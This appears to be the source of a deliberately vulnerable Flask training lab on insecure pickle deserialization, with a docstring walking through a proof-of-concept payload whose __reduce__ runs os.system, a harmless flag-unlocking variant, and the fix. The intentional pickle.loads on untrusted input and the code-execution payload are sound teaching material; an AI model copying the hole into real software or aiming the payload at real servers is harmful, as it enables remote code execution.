"""
Lab 10 -- Insecure deserialization (pickle).

POST /load with a base64-encoded pickle blob in the body. The app
calls pickle.loads on it -- arbitrary Python code execution because
pickle is Turing-complete by design.

WARNING: do not run in any environment you care about. This
intentionally executes whatever Python code is in the payload.

Run:
    pip install flask
    python app.py

In Nullock:
    1. Send /load with body: pickle.dumps([1,2,3]) base64-encoded.
       Response: list info.
    2. Build a malicious payload:
         python -c "import pickle,base64,os; \
                    class E: \
                        def __reduce__(self): return (os.system, ('id > /tmp/owned',)); \
                    print(base64.b64encode(pickle.dumps(E())).decode())"
    3. Send that as the body of /load. The server runs `id > /tmp/owned`.
    4. Confirm success without touching a shell: build a payload whose
       __reduce__ calls the in-process marker instead of os.system --
         python -c "import pickle,base64; \
                    def _mark_pwned(): pass; \
                    class E: \
                        def __reduce__(self): return (_mark_pwned, ()); \
                    print(base64.b64encode(pickle.dumps(E())).decode())"
       POST that to /load (the server's own _mark_pwned runs, since
       pickle resolves callables by module+name at load time -- it
       doesn't matter that the crafting script's copy is a no-op), then
       GET /flag. Same deserialization vuln as the os.system PoC above,
       just aimed at a harmless in-process marker so the check endpoint
       itself never has to run a shell command.
    5. Real fix: never deserialize untrusted pickle. Use JSON. If you
       MUST use pickle, sign it and verify HMAC before loads.
"""

import base64, hashlib, pickle
from flask import Flask, request, jsonify

app = Flask(__name__)
FLAG = "NULLOCK{%s}" % hashlib.sha256(b"lab-10-deserialization").hexdigest()[:16]

SOLVED = {"pwned": False}

def _mark_pwned():
    # Deliberately harmless -- the reachable-arbitrary-call is the
    # vulnerability being proven, not what gets called.
    SOLVED["pwned"] = True
    return "pwned"

@app.route("/load", methods=["POST"])
def load():
    raw = request.get_data()
    try:
        # VULN: untrusted pickle.
        obj = pickle.loads(base64.b64decode(raw))
        return jsonify(loaded=str(type(obj).__name__), value=str(obj)[:200])
    except Exception as e:
        return jsonify(error=str(e)), 400

@app.route("/flag")
def flag():
    if SOLVED["pwned"]:
        return jsonify(solved=True, flag=FLAG)
    return jsonify(solved=False), 403

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5010, debug=False)
